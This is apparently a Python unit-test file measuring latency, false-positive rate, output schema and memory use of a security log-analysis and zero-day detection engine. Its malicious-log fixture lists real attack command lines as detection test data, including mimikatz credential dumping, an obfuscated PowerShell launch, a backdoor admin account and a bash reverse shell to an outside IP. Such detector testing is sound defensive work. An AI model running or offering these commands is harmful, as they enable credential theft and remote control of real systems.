"""
Performance tests — latency, throughput, false-positive rate, memory footprint.
Target: analysis < 5s on warm engine; FP rate < 15% on benign logs.
"""
import sys, time, unittest, gc
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parents[1]))

from src.core.inference_engine import InferenceEngine
from src.core.zero_day_detector import ZeroDayDetector

# ── Fixtures ──────────────────────────────────────────────────────────────────

BENIGN_LOGS = [
    "2024-01-15T08:00:00 server01 sshd[1234]: Accepted password for deploy from 10.0.0.2 port 54321",
    "2024-01-15T08:01:00 server01 systemd[1]: Started Daily apt upgrade.",
    "2024-01-15T08:02:00 server01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.0.1 DST=10.0.0.2 PROTO=TCP DPT=80",
    "2024-01-15T09:15:00 web01 nginx: 10.0.1.5 - GET /index.html HTTP/1.1 200 1024",
    "2024-01-15T10:30:00 db01 postgres: LOG:  connection received: host=10.0.0.5 port=5432",
    "2024-01-15T11:00:00 server01 cron[5678]: (root) CMD (/usr/bin/apt-get -qq update)",
    "2024-01-15T12:00:00 backup01 rsync: sent 1024000 bytes received 200 bytes 2048.40 bytes/sec",
    "2024-01-15T13:45:00 server01 sshd: pam_unix(sshd:session): session opened for user admin",
    "2024-01-15T14:00:00 web01 apache2: 10.0.2.3 GET /api/health HTTP/1.1 200 42",
    "2024-01-15T15:30:00 server01 kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode",
]

MALICIOUS_LOGS = [
    (
        "powershell.exe -NoP -NonI -W Hidden -Exec Bypass "
        "-Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4A"
    ),
    "mimikatz sekurlsa::logonpasswords /full lsass.exe memory dump",
    "certutil.exe -decode payload.b64 payload.exe && regsvr32 /s payload.dll",
    "cmd.exe /c net user hacker P@ssw0rd! /add && net localgroup administrators hacker /add",
    "2024-01-15 ICMP echo 10.0.0.3 -> 8.8.8.8 payload=/bin/bash -i >& /dev/tcp/185.220.101.42/4444",
]


# ── Latency Tests ─────────────────────────────────────────────────────────────

class TestAnalysisLatency(unittest.TestCase):
    """Analysis must complete within 5 seconds on a warm engine (no training)."""

    @classmethod
    def setUpClass(cls):
        cls.engine = InferenceEngine.get_instance({})

    def _time_analyze(self, log_text: str) -> float:
        start = time.perf_counter()
        self.engine.analyze(log_text=log_text, pcap_text="", ioc="", customer_id="", mode="tool")
        return time.perf_counter() - start

    def test_short_log_under_5s(self):
        """Single-line benign log analyzed in < 5 seconds."""
        elapsed = self._time_analyze(BENIGN_LOGS[0])
        self.assertLess(elapsed, 5.0,
                        f"Short log took {elapsed:.2f}s — expected < 5s")

    def test_malicious_log_under_5s(self):
        """Malicious log with obfuscation analyzed in < 5 seconds."""
        elapsed = self._time_analyze(MALICIOUS_LOGS[0])
        self.assertLess(elapsed, 5.0,
                        f"Malicious log took {elapsed:.2f}s — expected < 5s")

    def test_multi_line_log_under_10s(self):
        """10-line log block analyzed in < 10 seconds."""
        combined = "\n".join(BENIGN_LOGS)
        elapsed = self._time_analyze(combined)
        self.assertLess(elapsed, 10.0,
                        f"Multi-line log took {elapsed:.2f}s — expected < 10s")

    def test_zero_day_detector_under_2s(self):
        """ZeroDayDetector alone must return in < 2 seconds."""
        zd = ZeroDayDetector()
        start = time.perf_counter()
        zd.detect("\n".join(BENIGN_LOGS))
        elapsed = time.perf_counter() - start
        self.assertLess(elapsed, 2.0,
                        f"ZeroDayDetector took {elapsed:.2f}s — expected < 2s")

    def test_repeated_calls_stable(self):
        """5 consecutive calls should each complete in < 5 seconds."""
        for i in range(5):
            elapsed = self._time_analyze(BENIGN_LOGS[i % len(BENIGN_LOGS)])
            self.assertLess(elapsed, 5.0,
                            f"Call #{i+1} took {elapsed:.2f}s")


# ── False Positive Rate ───────────────────────────────────────────────────────

class TestFalsePositiveRate(unittest.TestCase):
    """Alert rate on benign logs must stay below 15%."""

    @classmethod
    def setUpClass(cls):
        cls.engine = InferenceEngine.get_instance({})
        cls.zd = ZeroDayDetector()

    def test_ensemble_fp_rate(self):
        """Ensemble alert rate on benign logs < 15%."""
        alerts = 0
        for log in BENIGN_LOGS:
            result = self.engine.analyze(log_text=log, pcap_text="", ioc="",
                                         customer_id="", mode="tool")
            if result.get("risk_score", 0) >= 75:
                alerts += 1
        fp_rate = alerts / len(BENIGN_LOGS)
        self.assertLess(fp_rate, 0.15,
                        f"FP rate {fp_rate:.0%} exceeds 15% threshold ({alerts}/{len(BENIGN_LOGS)} alerted)")

    def test_zero_day_fp_rate(self):
        """Zero-day alert rate on benign logs < 20%."""
        alerts = 0
        for log in BENIGN_LOGS:
            result = self.zd.detect(log)
            if result.get("zero_day_score", 0) >= 60:
                alerts += 1
        fp_rate = alerts / len(BENIGN_LOGS)
        self.assertLess(fp_rate, 0.20,
                        f"Zero-day FP rate {fp_rate:.0%} exceeds 20% ({alerts}/{len(BENIGN_LOGS)} triggered)")

    def test_malicious_detection_rate(self):
        """True positive rate on known malicious logs must exceed 60%."""
        detected = 0
        for log in MALICIOUS_LOGS:
            result = self.engine.analyze(log_text=log, pcap_text="", ioc="",
                                         customer_id="", mode="tool")
            if result.get("risk_score", 0) >= 50:
                detected += 1
        tp_rate = detected / len(MALICIOUS_LOGS)
        self.assertGreater(tp_rate, 0.60,
                           f"TP rate {tp_rate:.0%} below 60% ({detected}/{len(MALICIOUS_LOGS)} caught)")


# ── Result Schema ─────────────────────────────────────────────────────────────

class TestResultSchema(unittest.TestCase):
    """Every analysis result must conform to the documented output schema."""

    @classmethod
    def setUpClass(cls):
        cls.engine = InferenceEngine.get_instance({})

    def _result(self, log):
        return self.engine.analyze(log_text=log, pcap_text="", ioc="",
                                   customer_id="", mode="tool")

    def test_required_top_level_keys(self):
        result = self._result(BENIGN_LOGS[0])
        for key in ("risk_score", "severity", "ensemble", "zero_day", "existing_threats"):
            self.assertIn(key, result, f"Missing key: {key}")

    def test_risk_score_in_range(self):
        result = self._result(MALICIOUS_LOGS[0])
        score = result.get("risk_score", -1)
        self.assertGreaterEqual(score, 0)
        self.assertLessEqual(score, 100)

    def test_severity_is_valid_string(self):
        result = self._result(BENIGN_LOGS[0])
        self.assertIn(result.get("severity"), ("INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"))

    def test_ensemble_has_model_scores(self):
        result = self._result(BENIGN_LOGS[0])
        ens = result.get("ensemble", {})
        self.assertIn("weighted_score", ens)

    def test_zero_day_has_score(self):
        result = self._result(BENIGN_LOGS[0])
        zd = result.get("zero_day", {})
        self.assertIn("zero_day_score", zd)

    def test_hunting_queries_present(self):
        result = self._result(BENIGN_LOGS[0])
        zd = result.get("zero_day", {})
        hq = zd.get("hunting_queries", {})
        self.assertIn("splunk", hq)
        self.assertIn("kql", hq)


# ── Memory ────────────────────────────────────────────────────────────────────

class TestMemoryFootprint(unittest.TestCase):
    """Engine should not grow unbounded across repeated analyses."""

    @classmethod
    def setUpClass(cls):
        cls.engine = InferenceEngine.get_instance({})

    def test_no_memory_leak_across_10_runs(self):
        """Memory usage after 10 analyses stays within 200 MB of baseline."""
        try:
            import psutil, os
            proc = psutil.Process(os.getpid())
            gc.collect()
            baseline_mb = proc.memory_info().rss / 1024 / 1024

            for i in range(10):
                self.engine.analyze(
                    log_text=BENIGN_LOGS[i % len(BENIGN_LOGS)],
                    pcap_text="", ioc="", customer_id="", mode="tool"
                )
            gc.collect()
            after_mb = proc.memory_info().rss / 1024 / 1024
            growth_mb = after_mb - baseline_mb

            self.assertLess(growth_mb, 200,
                            f"Memory grew by {growth_mb:.1f} MB over 10 runs — possible leak")
        except ImportError:
            self.skipTest("psutil not installed — skipping memory test")


if __name__ == "__main__":
    unittest.main(verbosity=2)
